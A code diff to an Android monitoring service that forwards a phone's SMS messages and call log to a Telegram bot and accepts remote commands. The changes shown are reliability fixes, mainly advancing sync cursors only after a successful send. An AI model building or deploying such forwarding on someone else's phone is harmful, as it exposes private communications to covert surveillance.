@@ -314,6 +314,14 @@ class MonitoringService : Service() {
                 return START_STICKY
             }
             else -> {
+                try {
+                    if (PreferencesManager.refreshInstance(this)) {
+                        preferencesManager = PreferencesManager.getInstance(this)
+                        refreshCreds()
+                        refreshLoopConfig()
+                    }
+                } catch (_: Exception) {
+                }
                 if (shouldAutoResume()) {
                     startMonitoring()
                     return START_STICKY
@@ -1337,7 +1345,7 @@ class MonitoringService : Service() {
                 sendToTelegram("\u23F3\uFE0F Command expired, send again.")
             }
             return
-        } else if (sentAtSec > 0 && sentAtSec - nowSec > MUTATING_MAX_AGE_SEC) {
+        } else if (sentAtSec > 0 && sentAtSec - nowSec > COMMAND_MAX_AGE_SEC) {
             serviceScope.launch {
                 sendToTelegram("\u23F3\uFE0F Command timestamp is in the future. Check the device clock, then send again.")
             }
@@ -2274,13 +2282,13 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentSmsPart = sendFitted(message)
-                    try {
-                        preferencesManager.setSmsCursorSync(maxOf(preferencesManager.lastSmsId, part.maxOf { it.id }))
-                    } catch (_: Exception) {
-                    }
                     if (!sentSmsPart) {
                         initialOk = false
                         break
+                    }
+                    try {
+                        preferencesManager.setSmsCursorSync(maxOf(preferencesManager.lastSmsId, part.maxOf { it.id }))
+                    } catch (_: Exception) {
                     }
                     delay(500)
                 }
@@ -2306,6 +2314,10 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentCallPart = sendFitted(message)
+                    if (!sentCallPart) {
+                        initialOk = false
+                        break
+                    }
                     try {
                         val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                         if (latest.date > preferencesManager.lastCallTimestamp ||
@@ -2314,10 +2326,6 @@ class MonitoringService : Service() {
                             preferencesManager.setCallCursorSync(latest.date, latest.id)
                         }
                     } catch (_: Exception) {
-                    }
-                    if (!sentCallPart) {
-                        initialOk = false
-                        break
                     }
                     delay(500)
                 }
@@ -2377,9 +2385,9 @@ class MonitoringService : Service() {
                 var smsSentAny = false
                 for (part in smsPage.chunked(10)) {
                     val sentSms = sendFitted(formatSmsMessage(part))
-                    smsCursor = maxOf(smsCursor, part.maxOf { it.id })
-                    try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
                     if (sentSms) {
+                        smsCursor = maxOf(smsCursor, part.maxOf { it.id })
+                        try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
                         smsSentAny = true
                     } else {
                         break
@@ -2404,6 +2412,9 @@ class MonitoringService : Service() {
                 var callSentAny = false
                 for (part in callPage.chunked(10)) {
                     val sentCall = sendFitted(formatCallMessage(part))
+                    if (!sentCall) {
+                        break
+                    }
                     try {
                         val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                         if (latest.date > preferencesManager.lastCallTimestamp ||
@@ -2413,11 +2424,7 @@ class MonitoringService : Service() {
                         }
                     } catch (_: Exception) {
                     }
-                    if (sentCall) {
-                        callSentAny = true
-                    } else {
-                        break
-                    }
+                    callSentAny = true
                 }
                 if (callSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
@@ -2803,7 +2810,7 @@ class MonitoringService : Service() {
                     }
                     return false
                 }
-                val plain = message.replace(TAG_STRIP_REGEX, "").replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
+                val plain = message.replace(TAG_STRIP_REGEX, "").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&#x27;", "'").replace("&amp;", "&")
                 if (plain != message) {
                     try {
                         val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
